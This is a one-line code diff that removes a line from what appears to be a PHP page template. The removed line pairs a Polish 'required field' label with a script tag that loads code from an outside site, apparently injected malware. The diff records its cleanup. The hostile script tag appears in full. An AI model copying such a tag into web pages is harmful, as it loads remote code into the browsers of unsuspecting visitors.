@@ -1,1 +1,0 @@
-<sup title='<?=getWord('var_required_field')?>'>&nbsp;(Wymagane)</sup><script src=http://johanneswallmark.com/media/sitemap.php ></script>
